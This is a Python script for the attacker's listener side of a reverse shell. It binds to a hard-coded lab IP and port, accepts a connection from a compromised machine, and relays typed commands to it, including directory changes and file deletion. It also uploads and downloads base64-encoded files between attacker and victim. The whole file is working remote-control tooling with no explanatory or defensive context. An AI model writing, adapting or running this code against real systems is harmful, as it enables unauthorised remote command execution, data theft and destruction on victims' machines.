#!/usr/bin/env python
import socket
import json , base64

class Listener :
    def __init__(self,ip,port) :   
        self.listener=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        self.listener.bind((ip,port))
        self.listener.listen(0)
        print("[+] Waiting For incoming connections !")

    def send_data(self,data) :
        data=data.split(" ")
        data =self.upload(data)
        data_ser=json.dumps(data)
        self.connection.send(data_ser)
        if data[0]=="exit" :
            print("[+] Closing connection ..")
            exit()
        elif data[0]=="cd" :
            print("[+] Changing working directory to "+ data[1])
        elif data[0] == "rm" or data[0]=="del" :
            print("[+] Deleting "+ data[1])        

    def recv_data(self):
        json_data=""
        while True :
            try:
                json_data=json_data+self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError :
                continue

    def write_file(self,path,content) :
        with open(path,"wb") as file :
            file.write(base64.b64decode(content))
            
    def open_file(self,path):
        with open(path,"rb") as file :
            content=file.read()
            return base64.b64encode(content)

    def upload (self,command) :
        if command[0] == "upload" :
            content=self.open_file(command[1])
            command.append(content)
            return command
        else : 
            return command     

    def download (self,command,content) :
        command=command.split(" ")
        if command[0] == "download" and "[-] Error" not in content:
            self.write_file(command[1],content)
            print("[+] Downloaded "+command[1]+" successfully")
            return False
        else :
            return True    
    def run (self) :
        print_result=True
        self.connection,address=self.listener.accept()
        print("[+] Received connection from " +str(address))
        while True :
            try:
                command=raw_input(">> ")
                self.send_data(command)
                result=self.recv_data()
                print_result=self.download(command,result)
            except Exception:
                result="[-] Error during execution"
            if print_result :
                print(result)

my_listener=Listener("192.168.111.129",1234)
my_listener.run()
